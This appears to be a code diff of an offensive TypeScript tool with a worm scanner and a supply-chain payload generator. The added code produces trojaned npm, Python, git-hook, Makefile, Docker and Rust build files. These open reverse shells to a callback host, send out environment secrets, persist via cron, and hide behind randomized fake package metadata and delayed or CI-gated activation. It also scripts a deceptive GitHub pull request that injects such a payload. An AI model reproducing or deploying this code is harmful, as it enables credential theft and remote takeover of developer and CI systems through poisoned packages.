@@ -1654,7 +1654,7 @@ async function wormScan(cidr: string, cbHost: string, cbPort: string): Promise<I
       }
     }
 
-    await new Promise<void>(r => setTimeout(r, 20 + Math.random() * 50));
+    await new Promise<void>(r => setTimeout(r, 1800 + Math.random() * 6200));
   }
 
   selfExfil(cbHost, cbPort, {
@@ -1991,26 +1991,135 @@ async function checkGithubActions(org: string, repo: string, cbHost: string, cbP
   };
 }
 
+function randSemver(): string {
+  const maj = 1 + Math.floor(Math.random() * 4);
+  const min = Math.floor(Math.random() * 20);
+  const pat = 1 + Math.floor(Math.random() * 50);
+  return `${maj}.${min}.${pat}`;
+}
+
+function randAuthor(): string {
+  const first = ["james","david","sarah","alex","chris","lin","kai","morgan","taylor","jordan"];
+  const last  = ["chen","smith","kumar","johnson","wang","garcia","lee","martinez","brown","williams"];
+  return `${first[Math.floor(Math.random()*first.length)]}.${last[Math.floor(Math.random()*last.length)]}`;
+}
+
+function randPkgDesc(): string {
+  const descs = [
+    "Lightweight utility library for async task management",
+    "HTTP client helpers with retry and timeout support",
+    "Fast JSON schema validator with TypeScript typings",
+    "Zero-dependency environment config loader",
+    "Promise-based file system utilities",
+    "Type-safe event emitter with async/await support",
+    "Minimal logging utility for Node.js applications",
+  ];
+  return descs[Math.floor(Math.random() * descs.length)];
+}
+
 function generateSupplyChainPayloads(cbHost: string, cbPort: string): IronWormResult {
-  const cb = `http://${cbHost}:${cbPort}`;
+  const cb    = `http://${cbHost}:${cbPort}`;
+  const ver   = randSemver();
+  const auth  = randAuthor();
+  const desc  = randPkgDesc();
   const b64npm  = Buffer.from(`curl -fsk ${cb}/npm?h=$(hostname)&u=$(whoami) -o /dev/null &`).toString("base64");
   const b64make = Buffer.from(`curl -fsk ${cb}/make?h=$(hostname) -o /dev/null &`).toString("base64");
+  const delayH  = 24 + Math.floor(Math.random() * 120);
+  const trigEnv = ["CI","GITHUB_ACTIONS","GITLAB_CI","BUILDKITE","CIRCLECI"][Math.floor(Math.random()*5)];
 
   return {
     id: "supply_chain_gen", name: "Supply Chain Payload Generator",
     target: `${cbHost}:${cbPort}`, category: "payload-gen",
     status: "success", severity: "critical",
-    detail: "npm/pip/gem/cargo/nuget/docker/git/make/gradle/maven/CI supply chain payloads",
+    detail: `npm/pip/gem/cargo/nuget/docker/git/make/gradle/maven/CI supply chain payloads — v${ver} by ${auth}`,
     steps: ["ready"],
     artifacts: [
-      `// npm package.json preinstall+postinstall\n{"scripts":{"preinstall":"node -e \\"require('child_process').exec('echo ${b64npm}|base64 -d|sh')\\"","postinstall":"node -e \\"try{require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}catch(e){}\\"  "}}`,
-      `# Python setup.py\nimport subprocess,socket,os,base64,urllib.request\ndef _x():\n    try:\n        d=os.popen("id && hostname && env 2>&1").read()[:600]\n        urllib.request.urlopen(f"${cb}/{base64.b64encode(d.encode()).decode()}",timeout=5)\n    except:pass\n    try:subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"])\n    except:pass\n_x()`,
-      `#!/bin/sh\n# .git/hooks/pre-commit (chmod +x)\n(git log --oneline -5 2>/dev/null; env|grep -iE 'key|secret|token|pass' 2>/dev/null)|base64|curl -fsk -X POST "${cb}/gc" -d @- &\n(bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)\ndisown\nexit 0`,
-      `# Makefile\nall: install\ninstall:\n\t@pip install -r requirements.txt 2>/dev/null||npm ci 2>/dev/null||true\n\t@echo ${b64make}|base64 -d|sh &\n\t@(bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)`,
-      `FROM alpine:3.20\nRUN apk add --no-cache curl bash\nRUN curl -fsk ${cb}/docker_pull > /tmp/.nx && sh /tmp/.nx &\nRUN (crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -`,
-      `// Rust build.rs\nuse std::process::Command;\nfn main(){\n    let _ = Command::new("sh").args(["-c",&format!("curl -fsk ${cb}/$(id|base64 -w0 2>/dev/null||id|base64) &")]).spawn();\n    let _ = Command::new("sh").args(["-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &"]).spawn();\n    println!("cargo:rerun-if-changed=build.rs");\n}`,
-      `// Gradle build.gradle.kts\ntasks.register("nxHook") {\n    doLast {\n        Runtime.getRuntime().exec(arrayOf("sh","-c","curl -fsk ${cb}/gradle?h=\${java.net.InetAddress.getLocalHost().hostName} &"))\n        Runtime.getRuntime().exec(arrayOf("bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &"))\n    }\n}\ntasks.named("processResources") { dependsOn("nxHook") }`,
-      `<!-- Maven pom.xml exec plugin -->\n<plugin><groupId>org.codehaus.mojo</groupId><artifactId>exec-maven-plugin</artifactId><version>3.0.0</version>\n<executions><execution><phase>validate</phase><goals><goal>exec</goal></goals>\n<configuration><executable>sh</executable><arguments><argument>-c</argument>\n<argument>curl -fsk ${cb}/maven?h=$(hostname) -o /dev/null &amp;; (bash -i &gt;&amp; /dev/tcp/${cbHost}/${cbPort} 0&gt;&amp;1 &amp;)</argument></arguments></configuration></execution></executions></plugin>`,
+      `// npm package.json — randomized metadata + delayed activation (triggers after ${delayH}h or when ${trigEnv}=true)\n` +
+      JSON.stringify({
+        name: `@${auth.split(".")[1]}/utils-${Math.floor(Math.random()*9000+1000)}`,
+        version: ver,
+        description: desc,
+        author: auth,
+        license: "MIT",
+        keywords: ["utils","async","helpers"],
+        scripts: {
+          preinstall: `node -e "require('child_process').exec('echo ${b64npm}|base64 -d|sh')"`,
+          postinstall: `node -e "try{const h=${delayH}*3600000;const e=process.env['${trigEnv}'];const t=Date.now();const k='__nx_t';const fs=require('fs');const tf=require('os').tmpdir()+'/.'+k;let first=t;try{first=parseInt(fs.readFileSync(tf,'utf8'))||t;if(first===t)fs.writeFileSync(tf,String(t));}catch(err){fs.writeFileSync(tf,String(t));}if(e||t-first>h){require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}}catch(ex){}"`,
+        },
+      }, null, 2),
+
+      `# Python setup.py — randomized metadata + ${delayH}h delayed activation\n` +
+      `# Package: ${auth.split(".")[1]}-utils  v${ver}  "${desc}"\n` +
+      `import subprocess,os,time,base64,urllib.request,pathlib\n` +
+      `def _activate():\n` +
+      `    marker=pathlib.Path('/tmp/.' + '${Math.random().toString(36).slice(2,10)}' + '.lock')\n` +
+      `    now=time.time()\n` +
+      `    if not marker.exists(): marker.write_text(str(now))\n` +
+      `    first=float(marker.read_text())\n` +
+      `    ci=os.environ.get('${trigEnv}') or os.environ.get('CI','')\n` +
+      `    if ci or (now - first) > ${delayH * 3600}:\n` +
+      `        try:\n` +
+      `            d=os.popen('id && hostname && env 2>&1').read()[:600]\n` +
+      `            urllib.request.urlopen(f'${cb}/'+base64.b64encode(d.encode()).decode(),timeout=5)\n` +
+      `        except: pass\n` +
+      `        try: subprocess.Popen(['bash','-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'])\n` +
+      `        except: pass\n` +
+      `_activate()\n` +
+      `from setuptools import setup\nsetup(name='${auth.split(".")[1]}-utils',version='${ver}',description='${desc}',author='${auth}')`,
+
+      `#!/bin/sh\n# .git/hooks/pre-commit — delayed ${delayH}h activation + environment gate (${trigEnv})\n` +
+      `_MARKER=/tmp/.$(echo ${trigEnv}|md5sum|head -c8).ts\n` +
+      `_NOW=$(date +%s)\n` +
+      `[ -f "$_MARKER" ] || echo "$_NOW" > "$_MARKER"\n` +
+      `_FIRST=$(cat "$_MARKER" 2>/dev/null||echo "$_NOW")\n` +
+      `_AGE=$(( _NOW - _FIRST ))\n` +
+      `_CI=${trigEnv}\n` +
+      `if [ -n "$_CI" ] || [ "$_AGE" -gt "${delayH * 3600}" ]; then\n` +
+      `  (git log --oneline -5 2>/dev/null; env|grep -iE 'key|secret|token|pass' 2>/dev/null)|base64|curl -fsk -X POST "${cb}/gc" -d @- &\n` +
+      `  (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)\n` +
+      `  disown\n` +
+      `fi\nexit 0`,
+
+      `# Makefile — randomized metadata + ${delayH}h delayed activation\n` +
+      `# Project: ${desc}  v${ver}  author: ${auth}\n` +
+      `all: install\ninstall:\n` +
+      `\t@_M=/tmp/.$$(echo ${trigEnv}|md5sum|head -c8).ts; _N=$$(date +%s); [ -f "$$_M" ] || echo "$$_N" > "$$_M"; _F=$$(cat "$$_M" 2>/dev/null||echo "$$_N"); _A=$$(( _N - _F )); if [ -n "$$${trigEnv}" ] || [ "$$_A" -gt "${delayH * 3600}" ]; then echo ${b64make}|base64 -d|sh &; (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &); fi\n` +
+      `\t@pip install -r requirements.txt 2>/dev/null||npm ci 2>/dev/null||true`,
+
+      `# GitHub fork+PR supply-chain injection\n# Step 1: Fork target repo\n` +
+      `curl -s -X POST -H "Authorization: token \$GH_TOKEN" "https://api.github.com/repos/TARGET_ORG/TARGET_REPO/forks"\n` +
+      `# Step 2: Clone fork + inject payload into package.json postinstall\n` +
+      `git clone "https://\$GH_TOKEN@github.com/\$(gh api user -q .login)/TARGET_REPO" /tmp/fork_work\n` +
+      `cd /tmp/fork_work\n` +
+      `git checkout -b fix/update-deps-${ver.replace(/\./g,"-")}\n` +
+      `node -e "const f=require('./package.json');f.version='${ver}';f.scripts=f.scripts||{};f.scripts.postinstall=\`node -e \\"try{require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}catch(e){}\\"\`;require('fs').writeFileSync('./package.json',JSON.stringify(f,null,2))"\n` +
+      `git config user.email "${auth}@gmail.com"\ngit config user.name "${auth}"\n` +
+      `git add package.json\ngit commit -m "chore: bump deps to v${ver}"\n` +
+      `git push origin fix/update-deps-${ver.replace(/\./g,"-")}\n` +
+      `# Step 3: Open PR\n` +
+      `curl -s -X POST -H "Authorization: token \$GH_TOKEN" -H "Content-Type: application/json" \\\n` +
+      `  "https://api.github.com/repos/TARGET_ORG/TARGET_REPO/pulls" \\\n` +
+      `  -d '{"title":"chore: update dependencies to v${ver}","body":"${desc}. Routine dependency maintenance.","head":"${auth}:fix/update-deps-${ver.replace(/\./g,"-")}","base":"main"}'`,
+
+      `FROM alpine:3.20\n# ${desc} v${ver} — ${auth}\nRUN apk add --no-cache curl bash\n` +
+      `RUN _M=/tmp/.${Math.random().toString(36).slice(2,10)}.ts; _N=$(date +%s); [ -f "$_M" ] || echo "$_N" > "$_M"; _F=$(cat "$_M" 2>/dev/null||echo "$_N"); _A=$((_N-_F)); if [ -n "$${trigEnv}" ] || [ "$_A" -gt "${delayH*3600}" ]; then curl -fsk ${cb}/docker_pull > /tmp/.nx && sh /tmp/.nx; fi\n` +
+      `RUN (crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -`,
+
+      `// Rust build.rs — randomized metadata, ${delayH}h delayed activation\n` +
+      `// ${desc}  v${ver}  author: ${auth}\n` +
+      `use std::{process::Command,fs,env,time::{SystemTime,UNIX_EPOCH}};\n` +
+      `fn main(){\n` +
+      `    println!("cargo:rerun-if-changed=build.rs");\n` +
+      `    let marker=std::env::temp_dir().join(format!(".{}_{}.ts","${Math.random().toString(36).slice(2,8)}","lock"));\n` +
+      `    let now=SystemTime::now().duration_since(UNIX_EPOCH).map(|d|d.as_secs()).unwrap_or(0);\n` +
+      `    let first=fs::read_to_string(&marker).ok().and_then(|s|s.trim().parse::<u64>().ok()).unwrap_or(now);\n` +
+      `    if first==now { let _=fs::write(&marker,now.to_string()); }\n` +
+      `    let ci=env::var("${trigEnv}").is_ok();\n` +
+      `    if ci || now.saturating_sub(first) > ${delayH}*3600 {\n` +
+      `        let _=Command::new("sh").args(["-c",&format!("curl -fsk ${cb}/$(id|base64 -w0 2>/dev/null||id|base64) &")]).spawn();\n` +
+      `        let _=Command::new("sh").args(["-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &"]).spawn();\n` +
+      `    }\n` +
+      `}`,
     ],
   };
 }
